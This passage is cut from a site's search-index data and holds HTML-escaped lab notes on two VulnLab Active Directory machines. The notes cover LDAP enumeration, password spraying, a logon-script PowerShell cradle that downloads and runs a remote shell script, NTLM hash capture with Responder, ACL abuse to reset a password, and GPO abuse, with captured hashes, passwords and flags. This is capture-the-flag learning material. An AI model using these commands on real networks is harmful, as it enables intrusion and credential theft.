data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE SERVICE       VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/tcp   open  domain        Simple DNS Plus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e88/tcp   open  kerberos-sec  Microsoft Windows Kerberos \u003cspan class=\"o\"\u003e(\u003c/span\u003eserver time: 2024-07-27 15:50:44Z\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e135/tcp  open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e389/tcp  open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: baby.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e445/tcp  open  microsoft-ds?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e464/tcp  open  kpasswd5?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e636/tcp  open  tcpwrapped\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3268/tcp open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: baby.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3269/tcp open  tcpwrapped\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3389/tcp open  ms-wbt-server Microsoft Terminal Services\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e rdp-ntlm-info:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Target_Name: BABY\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Domain_Name: BABY\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Computer_Name: BABYDC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Domain_Name: baby.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Computer_Name: BabyDC.baby.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Product_Version: 10.0.20348\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  System_Time: 2024-07-27T15:50:49+00:00\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2024-07-27T15:51:29+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e 0s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eBabyDC.baby.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-07-26T09:03:15\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-01-25T09:03:15\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eSSDP/UPnP\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-server-header: Microsoft-HTTPAPI/2.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: Service Unavailable\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: Host: BABYDC\u003cspan class=\"p\"\u003e;\u003c/span\u003e OS: Windows\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:microsoft:windows\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost script results:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-time:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   date: 2024-07-27T15:50:53\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  start_date: N/A\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-security-mode:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   311:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_    Message signing enabled and required\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eEnem of ldap :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eldapsearch -x -H ldap://\u003cspan class=\"nv\"\u003e$t\u003c/span\u003e -b \u003cspan class=\"s1\"\u003e\u0026#39;DC=baby,DC=vl\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e awk \u003cspan class=\"s1\"\u003e\u0026#39;/dn: / {print $2}\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eResult :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eldapsearch -H ldap://\u003cspan class=\"nv\"\u003e$t\u003c/span\u003e -x -b \u003cspan class=\"s1\"\u003e\u0026#39;DC=baby,DC=vl\u0026#39;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;*\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;*\u0026#34;\u003c/span\u003e  \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep userPrincipalName \u003cspan class=\"p\"\u003e|\u003c/span\u003e cut -d \u003cspan class=\"s2\"\u003e\u0026#34; \u0026#34;\u003c/span\u003e -f \u003cspan class=\"m\"\u003e2\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e cut -d \u003cspan class=\"s2\"\u003e\u0026#34;@\u0026#34;\u003c/span\u003e -f \u003cspan class=\"m\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eJacqueline.Barnett\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eAshley.Webb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHugh.George\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLeonard.Dyer\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eConnor.Wilkinson\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eJoseph.Hughes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eKerry.Wilson\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTeresa.Bell\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCaroline.Robinson\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eGrab a some creds :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Teresa Bell, it, baby.vl\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edn: \u003cspan class=\"nv\"\u003eCN\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eTeresa Bell,OU\u003cspan class=\"o\"\u003e=\u003c/span\u003eit,DC\u003cspan class=\"o\"\u003e=\u003c/span\u003ebaby,DC\u003cspan class=\"o\"\u003e=\u003c/span\u003evl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eobjectClass: top\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eobjectClass: person\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eobjectClass: organizationalPerson\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eobjectClass: user\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecn: Teresa Bell\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esn: Bell\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edescription: Set initial password to BabyStart123!\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egivenName: Teresa\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edistinguishedName: \u003cspan class=\"nv\"\u003eCN\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eTeresa Bell,OU\u003cspan class=\"o\"\u003e=\u003c/span\u003eit,DC\u003cspan class=\"o\"\u003e=\u003c/span\u003ebaby,DC\u003cspan class=\"o\"\u003e=\u003c/span\u003evl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003einstanceType: \u003cspan class=\"m\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewhenCreated: 20211121151108.0Z\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewhenChanged: 20211121151437.0Z\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edisplayName: Teresa Bell\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euSNCreated: \u003cspan class=\"m\"\u003e12889\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ememberOf: \u003cspan class=\"nv\"\u003eCN\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eit,CN\u003cspan class=\"o\"\u003e=\u003c/span\u003eUsers,DC\u003cspan class=\"o\"\u003e=\u003c/span\u003ebaby,DC\u003cspan class=\"o\"\u003e=\u003c/span\u003evl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euSNChanged: \u003cspan class=\"m\"\u003e12905\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ename: Teresa Bell\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eobjectGUID:: EDGXW4JjgEq7+GuyHBu3QQ\u003cspan class=\"o\"\u003e==\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euserAccountControl: \u003cspan class=\"m\"\u003e66080\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebadPwdCount: \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecodePage: \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecountryCode: \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebadPasswordTime: \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elastLogoff: \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elastLogon: \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epwdLastSet: \u003cspan class=\"m\"\u003e132819812778759642\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eprimaryGroupID: \u003cspan class=\"m\"\u003e513\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eobjectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWgQAAA\u003cspan class=\"o\"\u003e==\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaccountExpires: \u003cspan class=\"m\"\u003e9223372036854775807\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elogonCount: \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esAMAccountName: Teresa.Bell\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esAMAccountType: \u003cspan class=\"m\"\u003e805306368\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euserPrincipalName: Teresa.Bell@baby.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eobjectCategory: \u003cspan class=\"nv\"\u003eCN\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ePerson,CN\u003cspan class=\"o\"\u003e=\u003c/span\u003eSchema,CN\u003cspan class=\"o\"\u003e=\u003c/span\u003eConfiguration,DC\u003cspan class=\"o\"\u003e=\u003c/span\u003ebaby,DC\u003cspan class=\"o\"\u003e=\u003c/span\u003evl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edSCorePropagationData: 20211121163014.0Z\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edSCorePropagationData: 20211121162927.0Z\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edSCorePropagationData: 16010101000416.0Z\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emsDS-SupportedEncryptionTypes: \u003cspan class=\"m\"\u003e0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003ePassword spraying with net exec:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e netexec ldap \u003cspan class=\"nv\"\u003e$t\u003c/span\u003e -u usernames.txt -p \u003cspan class=\"s1\"\u003e\u0026#39;BabyStart123!\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eCaroline.Robinson : BabyStart123!\u003c/p\u003e","tags":[],"title":"Baby"},{"content":"Scan\nPORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-07-31 13:04:24Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.baby2.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.baby2.vl | Not valid before: 2024-07-31T12:53:02 |_Not valid after: 2025-07-31T12:53:02 |_ssl-date: TLS randomness does not represent time 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.baby2.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.baby2.vl | Not valid before: 2024-07-31T12:53:02 |_Not valid after: 2025-07-31T12:53:02 |_ssl-date: TLS randomness does not represent time 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=dc.baby2.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.baby2.vl | Not valid before: 2024-07-31T12:53:02 |_Not valid after: 2025-07-31T12:53:02 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=dc.baby2.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.baby2.vl | Not valid before: 2024-07-31T12:53:02 |_Not valid after: 2025-07-31T12:53:02 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=dc.baby2.vl | Not valid before: 2024-07-30T13:02:12 |_Not valid after: 2025-01-29T13:02:12 | rdp-ntlm-info: | Target_Name: BABY2 | NetBIOS_Domain_Name: BABY2 | NetBIOS_Computer_Name: DC | DNS_Domain_Name: baby2.vl | DNS_Computer_Name: dc.baby2.vl | DNS_Tree_Name: baby2.vl | Product_Version: 10.0.20348 |_ System_Time: 2024-07-31T13:05:03+00:00 |_ssl-date: 2024-07-31T13:05:43+00:00; -1s from scanner time. Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -1s, deviation: 0s, median: -1s | smb2-time: | date: 2024-07-31T13:05:04 |_ start_date: N/A | smb2-security-mode: | 311: |_ Message signing enabled and required\rnetexec smb 10.10.65.99 -u \u0026#34;Guest\u0026#34; -p \u0026#34;\u0026#34; --shares netexec smb $t -u \u0026#34; library\u0026#34; -p \u0026#34;library\u0026#34; kerbrute userenum --dc $t -d baby2.vl /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt\rgrep -o \u0026#39;\u0026#34;samaccountname\u0026#34;: \u0026#34;[^\u0026#34;]*\u0026#34;\u0026#39; 20240731155912_users.json | sed \u0026#39;s/\u0026#34;samaccountname\u0026#34;: \u0026#34;\\(.*\\)\u0026#34;/\\1/\u0026#39;\rUsers list :\nAmelia.Griffiths library Joel.Hurst Lynda.Bailey Nicola.Lamb Kieran.Mitchell Ryan.Jenkins Carl.Moore Joan.Jennings Harry.Shaw krbtgt Mohammed.Harris Administrator Guest gpoadm\rnetexec smb $t -u \u0026#34;user.txt\u0026#34; -p \u0026#34;user.txt\u0026#34; --no-bruteforce --continue-on-success\rNew creds : Carl.Moore:Carl.Moore\nAccess to scripts folder and modify the logon.vbs and place a reverse shell . Set objShell = CreateObject(\u0026#34;WScript.Shell\u0026#34;) \u0026#39; Command to run PowerShell and execute the remote script powerShellCmd = \u0026#34;powershell -c \u0026#34;\u0026#34;IEX(New-Object System.Net.WebClient).DownloadString(\u0026#39;http://10.8.3.12:80/shell.ps1\u0026#39;)\u0026#34;\u0026#34;\u0026#34; \u0026#39; Run the PowerShell command objShell.Run powerShellCmd, 1, True #The port 80 was for the responder to grab some hash Catch hash with #responder: Responder.py -I tun0 [SMB] NTLMv1-SSP Client : 10.10.64.174 [SMB] NTLMv1-SSP Username : BABY2\\Amelia.Griffiths [SMB] NTLMv1-SSP Hash : Amelia.Griffiths::BABY2:D3444DD9B4F08BE400000000000000000000000000000000:29AF41240D2B1D9A17B06B5AD77BB1E5EB79D507D4F6DE8A:1122334455667788\rUser VL{36a82a40b7dce3fa5b07a0cc81a45d22}\nACL :\nImport-Module ./PowerView.ps1 Set-DomainObjectOwner -identity gpoadm -OwnerIdentity Amelia.Griffiths Add-DomainObjectAcl -TargetIdentity gpoadm -PrincipalIdentity Amelia.Griffiths -Rights ResetPassword $cred = ConvertTo-SecureString \u0026#34;qwer1234QWER!@#$\u0026#34; -AsPlainText -force Set-DomainUserPassword -identity gpoadm -accountpassword $cred\rTool: https://github.com/Hackndo/pyGPOAbuse.git\nGPO : #GPOabuse pygpoabuse.py baby2.vl/gpoadm -hashes \u0026#34;:20DEF05980FC9E4C846AE5530963B573\u0026#34; -gpo-id \u0026#34;31B2F340-016D-11D2-945F-00C04FB984F9\u0026#34; -dc-ip 10.10.109.95 gpupdate /force default creds : john H4x00r123..\rRoot VL{f0205b652ed74c5deed92b7a6a163516}\n","date":"2023-09-07","id":19,"permalink":"/notes/lab/vulnlab/baby2/","summary":"\u003cp\u003e\u003cstrong\u003eScan\u003c/strong\u003e\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE SERVICE       VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/tcp   open  domain        Simple DNS Plus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e88/tcp   open  kerberos-sec  Microsoft Windows Kerberos \u003cspan class=\"o\"\u003e(\u003c/span\u003eserver time: 2024-07-31 13:04:24Z\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e135/tcp  open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e389/tcp  open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: baby2.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003edc.baby2.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 